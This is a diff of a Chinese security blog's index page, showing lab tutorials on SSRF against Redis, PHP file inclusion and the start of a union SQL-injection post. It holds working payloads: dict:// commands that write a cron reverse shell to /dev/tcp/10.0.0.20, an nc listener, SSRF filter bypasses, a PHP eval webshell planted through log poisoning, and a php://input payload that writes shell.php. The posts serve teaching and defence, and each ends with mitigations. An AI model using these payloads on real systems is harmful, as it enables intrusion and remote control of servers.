+<li><p>Ubuntu作为受害者服务器, 使用包含 SSRF 漏洞的靶场进行<code>dict://</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://10.0.0.10:6379/info</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/6.png"></p>
+</li>
+</ul>
+<hr>
+<h5 id="02-写定时任务"><a href="#02-写定时任务" class="headerlink" title="02 写定时任务"></a>02 写定时任务</h5><ol>
+<li><p>定时任务通过<code>crond</code>完成, 是linux的定时执行工具, 不同系统定时任务目录如下:</p>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>目录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CentOS</td>
+<td>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</td>
+</tr>
+<tr>
+<td>Ubuntu</td>
+<td>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>可根据服务器存在的文件判断服务器信息</p>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CentOS</td>
+<td>&#x2F;etc&#x2F;os-release</td>
+</tr>
+<tr>
+<td>Ubuntu</td>
+<td>&#x2F;etc&#x2F;lsb-release</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>使用攻击主机监听一个端口, 用来接收受害主机执行定时任务的反弹shell</p>
+<ul>
+<li>攻击机和目标机必须在同一环境:<ul>
+<li>本地靶场 → 本地kali攻击机</li>
+<li>公网服务器目标 → 公网服务器攻击机</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/7.png"></p>
+<blockquote>
+<p>开启监听…</p>
+</blockquote>
+</li>
+<li><p>在存在漏洞的网站依次执行如下指令:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 清空数据库(慎用)</span><br><span class="line">dict://10.0.0.10:6379/flushall</span><br><span class="line"># 设置工作目录</span><br><span class="line">dict://10.0.0.10:6379/config set dir /var/spool/cron/crontabs/</span><br><span class="line"># 设置保存的文件名</span><br><span class="line">dict://10.0.0.10:6379/config set dbfilename root</span><br><span class="line"># 设置变量x, 若在本地kali监听, 下方ip需修改为kali</span><br><span class="line">dict://10.0.0.10:6379/set x &quot;\n\n*/1 * * * * bash -i &amp;&gt; /dev/tcp/10.0.0.20/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line"># 这里 \n 越多越好(防止换行失败导致反弹shell失败)</span><br><span class="line"># 保存</span><br><span class="line">dict://10.0.0.10:6379/save</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h5 id="03-SSH公钥写入"><a href="#03-SSH公钥写入" class="headerlink" title="03 SSH公钥写入"></a>03 SSH公钥写入</h5><p>SSH 密钥对, 一把公钥, 一把私钥, 公钥存放在 SSH 服务器, 私钥个人保存</p>
+<ul>
+<li><p>公钥登录: <code>public key 认证</code></p>
+</li>
+<li><p>原理:</p>
+<ol>
+<li><p>用户将公钥存储在远程服务器</p>
+</li>
+<li><p>登录时远程服务器向用户发送一段随机字符串</p>
+</li>
+<li><p>私钥加密字符串, 发送给远程主机</p>
+</li>
+<li><p>远程主机使用公钥解密, 解密成功 → 登录</p>
+</li>
+</ol>
+<blockquote>
+<p>public key 认证图解</p>
+</blockquote>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/8.png"></p>
+</li>
+</ul>
+<p><strong>漏洞原理:</strong></p>
+<ul>
+<li>Redis 服务未授权可以写入文件</li>
+<li>将公钥写入服务器即可实现免密登录</li>
+</ul>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/9.png"></p>
+<hr>
+<h5 id="04-gopher协议攻击内网应用"><a href="#04-gopher协议攻击内网应用" class="headerlink" title="04 gopher协议攻击内网应用"></a>04 gopher协议攻击内网应用</h5><p><code>gopher</code>可发送各种格式的请求包, 攻击内网FTP, Telnet, Redis, Memcache, 也可以进行GET, POST请求, 还可以攻击内网未授权MySQL</p>
+<p><code>gopher</code> 协议默认端口70, 所以需要指定web端口, 且需要指定方法, 数据需要进行URL, 回车换行使用<code>%0d</code> <code>%0a</code></p>
+<p><strong>基本协议格式:</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;TCP数据流</span><br></pre></td></tr></table></figure>
+
+<p>gopherus 运用</p>
+<p>在 SSRF 易受攻击的站点上生成 gopher 负载以利用 SSRF 并获得 RCE</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看工具帮助以及受支持的攻击类型</span></span><br><span class="line">uv run gopherus.py -h</span><br><span class="line"><span class="comment"># 攻击redis</span></span><br><span class="line">uv run gopherus.py --exploit redis</span><br><span class="line"><span class="comment">#   [1] ReverseShell - 反弹 Shell 到攻击机</span></span><br><span class="line"><span class="comment">#   [2] PHPShell     - 写入 PHP WebShell</span></span><br><span class="line"><span class="comment"># 1. 配置监听地址 100.100.103.85(redis服务器地址)</span></span><br><span class="line"><span class="comment"># 2. 配置 Crontab 目录</span></span><br><span class="line"><span class="comment"># 3. 自动生成利用链接 gopher://xxx...[相当于简化版定时任务]</span></span><br><span class="line"><span class="comment"># 4. 攻击机开启监听</span></span><br><span class="line">nc -lvp 1234</span><br><span class="line"><span class="comment"># 5. 将利用链接URL 编码至SSRF漏洞中</span></span><br><span class="line"><span class="comment"># 6. RCE</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-0-绕过"><a href="#4-0-绕过" class="headerlink" title="4.0 绕过"></a>4.0 绕过</h3><table>
+<thead>
+<tr>
+<th>绕过类型</th>
+<th>案例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>302跳转</td>
+<td><code>sudo.cc</code>服务, 访问服务时, 自动重定向到<code>127.0.0.1</code></td>
+</tr>
+<tr>
+<td><code>@</code>绕过</td>
+<td><code>xx@host</code>&#x3D;&#x3D;<code>host</code>, 只解析<code>@</code>之后的内容</td>
+</tr>
+<tr>
+<td>IP进制编码</td>
+<td><code>127.0.0.1</code>&#x3D;&#x3D;<code>0x7f.0x0.0x0.0x1(Hex)</code>…</td>
+</tr>
+<tr>
+<td>特殊数字</td>
+<td>如: 1②7.0.0.1</td>
+</tr>
+<tr>
+<td>中文句号</td>
+<td><code>。</code>代替<code>.</code></td>
+</tr>
+<tr>
+<td>0省略</td>
+<td><code>127.0.0.1</code>&#x3D;&#x3D;<code>127.1</code></td>
+</tr>
+<tr>
+<td>特殊0</td>
+<td>在Windows中0代表0.0.0.0 ; Linux中0代表127.0.0.1</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>以上绕过现代系统大多数均已修复, 仅作了解</p>
+</blockquote>
+<hr>
+<h3 id="5-0-防御"><a href="#5-0-防御" class="headerlink" title="5.0 防御"></a>5.0 防御</h3><table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>防什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>协议白名单(只放 http&#x2F;https)</td>
+<td>file&#x2F;dict&#x2F;gopher</td>
+</tr>
+<tr>
+<td>解析后校验 IP(禁私网&#x2F;回环&#x2F;链路本地)</td>
+<td>直连内网</td>
+</tr>
+<tr>
+<td>禁用 <code>CURLOPT_FOLLOWLOCATION</code></td>
+<td>302 跳转绕过</td>
+</tr>
+<tr>
+<td><code>CURLOPT_RESOLVE</code> 锁定 IP</td>
+<td>DNS Rebinding（关键）</td>
+</tr>
+<tr>
+<td>出口防火墙 &#x2F; 网络隔离</td>
+<td>纵深兜底</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/04/web-security/upload-file/2026-08-04-include-file/" class="post-title-link" itemprop="url">Include-File</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-04 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-04T22:00:00+08:00">2026-08-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-06 14:58:44" itemprop="dateModified" datetime="2026-08-06T14:58:44+08:00">2026-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/include-file/" itemprop="url" rel="index"><span itemprop="name">include-file</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP Apache</p>
+</blockquote>
+<blockquote>
+<p>Lab: Local Scripts</p>
+</blockquote>
+<hr>
+<h2 id="1-0-文件包含"><a href="#1-0-文件包含" class="headerlink" title="1.0 文件包含"></a>1.0 文件包含</h2><h3 id="1-1文件包含漏洞分类"><a href="#1-1文件包含漏洞分类" class="headerlink" title="1.1文件包含漏洞分类"></a>1.1文件包含漏洞分类</h3><ul>
+<li><p>本地文件包含漏洞(LFI): 包含服务器本地的文件</p>
+</li>
+<li><p>远程文件包含漏洞(RFI): 包含远程服务器上的文件</p>
+<ul>
+<li>触发前提: (php.ini):<ul>
+<li>allow_url_fopen &#x3D; On(默认On, 影响fopen类函数)</li>
+<li>allow_url_include &#x3D; On(默认Off, RFI的关键前提)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>常见触发函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code></td>
+<td>包含并执行文件; <strong>失败时产生Warning, 脚本继续执行</strong></td>
+</tr>
+<tr>
+<td><code>include_once()</code></td>
+<td>同include(), 但<strong>同一文件只包含一次</strong></td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>包含并执行文件; <strong>失败时产生Fatal Error, 脚本终止</strong></td>
+</tr>
+<tr>
+<td><code>require_once()</code></td>
+<td>同require()，但<strong>同一文件只包含一次</strong></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>漏洞本质: include&#x2F;require的参数可被用户控制且未做有效过滤</p>
+</li>
+</ul>
+<hr>
+<h3 id="1-2-文件包含漏洞发现及其利用"><a href="#1-2-文件包含漏洞发现及其利用" class="headerlink" title="1.2 文件包含漏洞发现及其利用"></a>1.2 文件包含漏洞发现及其利用</h3><ul>
+<li><p>目录穿越:</p>
+<ul>
+<li>..&#x2F;</li>
+<li>….&#x2F;&#x2F;(双写)</li>
+</ul>
+</li>
+<li><p>本地文件包含漏洞利用</p>
+<p>01 配合文件上传使用, 找不到文件上传漏洞时, 无法上传WebShell, 可先上传图片格式WebShell到服务器, 再利用本地文件包含漏洞进行解析</p>
+<p>02 包含Apache日志文件: 网站存在文件包含漏洞, 但无文件上传点, 这时可利用Apache日志文件生成一句话木马</p>
+<ul>
+<li>利用条件:<ul>
+<li>日志文件可读权限</li>
+<li>日志文件存储路径已知</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="1-2-1-日志文件漏洞利用案例"><a href="#1-2-1-日志文件漏洞利用案例" class="headerlink" title="1.2.1 日志文件漏洞利用案例:"></a>1.2.1 日志文件漏洞利用案例:</h4><p><strong>注意:</strong> 需要开启Apache日志记录功能</p>
+<ul>
+<li><p>httpd.conf → CustomLog “logs&#x2F;access.log” common</p>
+</li>
+<li><p>为什么用 Burp? 浏览器会把 <code>&lt;</code> <code>&gt;</code> <code>空格</code> URL 编码, 编码文本进日志后无法构成 &lt;?php 标签</p>
+<p>Burp可控制原始字节, 且请求行即使返回 400, 也会被写进日志(利用点)</p>
+</li>
+<li><p>common格式只记请求行, 毒化点放在 URL; 若想毒化 UA&#x2F;Referer, 需combined格式</p>
+</li>
+</ul>
+<p><strong>如下图, 使用BurpSuite抓包修改注入一句话木马</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/1.png"></p>
+<blockquote>
+<p>拦截数据包修改请求</p>
+</blockquote>
+<hr>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/2.png"></p>
+<blockquote>
+<p>如图, 日志中成功注入一句话木马</p>
+</blockquote>
+<hr>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/3.png"></p>
+<blockquote>
+<p>通过已知日志文件路径访问并获得WebShell</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="1-3-PHP伪协议"><a href="#1-3-PHP伪协议" class="headerlink" title="1.3 PHP伪协议"></a>1.3 PHP伪协议</h3><h4 id="1-3-1-概述"><a href="#1-3-1-概述" class="headerlink" title="1.3.1 概述:"></a>1.3.1 概述:</h4><ul>
+<li><p>PHP伪协议即 <strong>Stream Wrappers(流封装器)</strong>, 是PHP的统一I&#x2F;O抽象层, 让同一套文件函数(<code>include/fopen/file_get_contents...</code>)能操作文件, 网络, 压缩包, 内存等不同数据源。</p>
+</li>
+<li><p>漏洞本质:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户可控的<span class="string">&quot;路径&quot;</span>进入文件函数</span><br><span class="line">	+ 攻击者用协议切换<span class="string">&quot;文件&quot;</span>的语义</span><br><span class="line">	= 读(源码<span class="regexp">/配置) or 执行(包含/</span>反序列化)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PHP支持的伪协议:</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>php:&#x2F;&#x2F;</strong></td>
+<td>访问I&#x2F;O流</td>
+</tr>
+<tr>
+<td><strong>phar:&#x2F;&#x2F;</strong></td>
+<td>PHP归档</td>
+</tr>
+<tr>
+<td><strong>file:&#x2F;&#x2F;</strong></td>
+<td>本地文件系统</td>
+</tr>
+<tr>
+<td><strong>zip:&#x2F;&#x2F;</strong></td>
+<td>ZIP归档</td>
+</tr>
+<tr>
+<td>data:&#x2F;&#x2F;</td>
+<td>内联数据(RFC 2397)</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>php:&#x2F;&#x2F;</p>
+<ul>
+<li>php:&#x2F;&#x2F;filter 元封装器, 读源码首选, 无任何配置前提</li>
+<li>php:&#x2F;&#x2F;input 请求体原始只读流, 配合 include 把 POST 体当代码执行</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>php:&#x2F;&#x2F;filter 参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;数据流&gt;</td>
+<td><strong>必选</strong>, 指定要筛选过滤的数据流</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链过滤器&gt;</td>
+<td>可选, 读链过滤器, 管道符&#96;</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链过滤器&gt;</td>
+<td>可选, 写链过滤器</td>
+</tr>
+<tr>
+<td>&lt;无前缀过滤器链&gt;</td>
+<td>任何没有以 read&#x3D; &#x2F; write&#x3D; 作为前缀的过滤器列表会视情况应用于读链或写链</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于str_rot13(), rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于strtoupper(), 转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于strtolower(), 转小写字母</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp;<br>convert.base64-decode</td>
+<td>等同于base64_encode() &amp;<br>base64_decode(), <strong>base64编码和解码</strong></td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp;<br>convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与8-bit字符串编码和解码</td>
+</tr>
+</tbody></table>
+<p><strong>重点:</strong></p>
+<ul>
+<li>为什么要Base64?<ul>
+<li>防止源码被PHP引擎执行, 原样输出后再本地解码</li>
+</ul>
+</li>
+<li>不只对<code>include()</code>有效, 对<code>file_get_contents()/readfile()/fopen()</code>同样生效</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-3-2-案例"><a href="#1-3-2-案例" class="headerlink" title="1.3.2 案例:"></a>1.3.2 案例:</h4><ul>
+<li><p><strong>Case 1: php:&#x2F;&#x2F;filter源码读取</strong></p>
+<p><code>content.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>user.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>利用伪协议读取源码</p>
+</blockquote>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/4.png"></p>
+<blockquote>
+<p>通过php:&#x2F;&#x2F;filter成功读取到经过base64编码的源代码, 再通过解码器解码获得源码</p>
+</blockquote>
+<ul>
+<li>读取型函数下 base64 的额外价值: <ul>
+<li>绕路径过滤&#x2F;WAF关键词</li>
+<li>源码直接回显时<code>&lt;?php ..?&gt; </code>会被浏览器当作XML处理指令吞掉, 页面空白<code>base64</code>保证可见</li>
+</ul>
+</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>Case 2: php:&#x2F;&#x2F;input代码执行</strong></p>
+<p>原理: 可以访问请求的原始数据只读流, 将post请求的数据当作php代码执行</p>
+<blockquote>
+<p>前提: allow_url_include&#x3D;On(默认 Off)</p>
+</blockquote>
+<ul>
+<li><p>Payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[cmd]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>写入一个文件<code>shell.php</code> ,文件内容为一句话木马</p>
+</blockquote>
+</li>
+</ul>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/5.png"></p>
+<blockquote>
+<p>抓包修改GET请求为POST类型, 并在请求体写入Payload</p>
+</blockquote>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/6.png"></p>
+<blockquote>
+<p>通过shell.php成功getshell !</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="1-4-修复防范"><a href="#1-4-修复防范" class="headerlink" title="1.4 修复防范"></a>1.4 修复防范</h3><ul>
+<li><p>数据输入验证</p>
+<ul>
+<li>对用户提交的文件路径参数进行严格的格式检查和白名单策略, 只允许包含预定义的, 安全的文件路径</li>
+<li>禁止包含绝对路径, 转而使用相对路径, 并且确保相对路径不会超出预期的目录范围</li>
+</ul>
+</li>
+<li><p>禁用危险函数或配置</p>
+<ul>
+<li>如果不是必须, 尽量避免使用容易导致文件包含漏洞的函数, 如PHP中的<code>allow_url_include</code>配置项应设为<code>Off</code>以禁用远程文件包含</li>
+<li>在php.ini配置文件中, 可以设置<code>open_basedir</code>限制PHP脚本只能访问指定目录及其子目录下的文件</li>
+</ul>
+</li>
+<li><p>使用安全函数</p>
+<ul>
+<li>使用更安全的函数替代易出问题的文件包含函数, 例如在PHP中, 可以使用<code>readfile()</code>配合自定义的文件路径处理逻辑来代替<code>include()</code></li>
+</ul>
+</li>
+<li><p>错误处理与日志记录</p>
+<ul>
+<li>正确处理文件包含失败的情况, 不要暴露过多的错误信息, 以免给攻击者提供有用的信息</li>
+<li>记录详细的日志, 以便在发生异常时追溯分析问题</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2324,199 +3402,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/private/icon1.png">
-      <meta itemprop="name" content="Byron">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Byron">
-      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Byron">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/" class="post-title-link" itemprop="url">Union Injection</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-07-06 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-06T22:00:00+08:00">2026-07-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-07 20:29:10" itemprop="dateModified" datetime="2026-07-07T20:29:10+08:00">2026-07-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
-        </span>
-          , 
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: sqli-labs Less-2</p>
-</blockquote>
-<h2 id="1-0-前置基础"><a href="#1-0-前置基础" class="headerlink" title="1.0 前置基础"></a>1.0 前置基础</h2><h3 id="1-1-Web应用三层架构"><a href="#1-1-Web应用三层架构" class="headerlink" title="1.1 Web应用三层架构:"></a>1.1 Web应用三层架构:</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/web-application-architecture.png"></p>
-<blockquote>
-<p>SQL 注入恶意输入来源于表现层, 经业务逻辑传递, 在数据访问层拼接 SQL 时触发执行</p>
-</blockquote>
-<hr>
-<h3 id="1-2-order-by-探测-排序"><a href="#1-2-order-by-探测-排序" class="headerlink" title="1.2 order by (探测&#x2F;排序)"></a>1.2 order by (探测&#x2F;排序)</h3><p><strong>01 语法格式:</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n;</span><br></pre></td></tr></table></figure>
-
-<p><strong>02 作用:</strong></p>
-<ul>
-<li>用于探测指定表的列数</li>
-</ul>
-<hr>
-<h3 id="1-3-union-联合查询"><a href="#1-3-union-联合查询" class="headerlink" title="1.3 union (联合查询)"></a>1.3 union (联合查询)</h3><p><strong>01 联合查询语法:</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1 </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
-
-<p><strong>02 特性:</strong></p>
-<ul>
-<li>列数必须完全相等：前后两条SELECT查询的字段数量必须一致</li>
-<li>数据类型必须兼容</li>
-</ul>
-<hr>
-<h3 id="1-4-系统库-information-schema"><a href="#1-4-系统库-information-schema" class="headerlink" title="1.4 系统库 information_schema"></a>1.4 系统库 information_schema</h3><p><strong>01 概述:</strong></p>
-<p> <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace"><strong>information_schema</strong></span> 是MySQL 5.0 及以上版本自带的“元数据库”,正是该库的特性,才提供了后续注入的核心内容!</p>
-<p><strong>02 结构图解:</strong></p>
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/information_schema.png"></p>
-<p><strong>03 字段解读:</strong></p>
-<ul>
-<li>schemata: 存储所有数据库的信息<ul>
-<li>schema_name(数据库名)</li>
-</ul>
-</li>
-<li>tables<ul>
-<li>table_schema(所属数据库名)</li>
-<li>table_name(数据表名)</li>
-</ul>
-</li>
-<li>columns<ul>
-<li>table_schema(所属数据库名)</li>
-<li>table_name(所属表名)</li>
-<li>column_name(字段名)</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="2-0-手工注入"><a href="#2-0-手工注入" class="headerlink" title="2.0 手工注入"></a>2.0 手工注入</h2><h3 id="2-1-注入流程"><a href="#2-1-注入流程" class="headerlink" title="2.1 注入流程"></a>2.1 注入流程</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/process.png"></p>
-<h3 id="2-2-注入案例"><a href="#2-2-注入案例" class="headerlink" title="2.2 注入案例"></a>2.2 注入案例</h3><table>
-<thead>
-<tr>
-<th>靶场</th>
-<th>关卡</th>
-</tr>
-</thead>
-<tbody><tr>
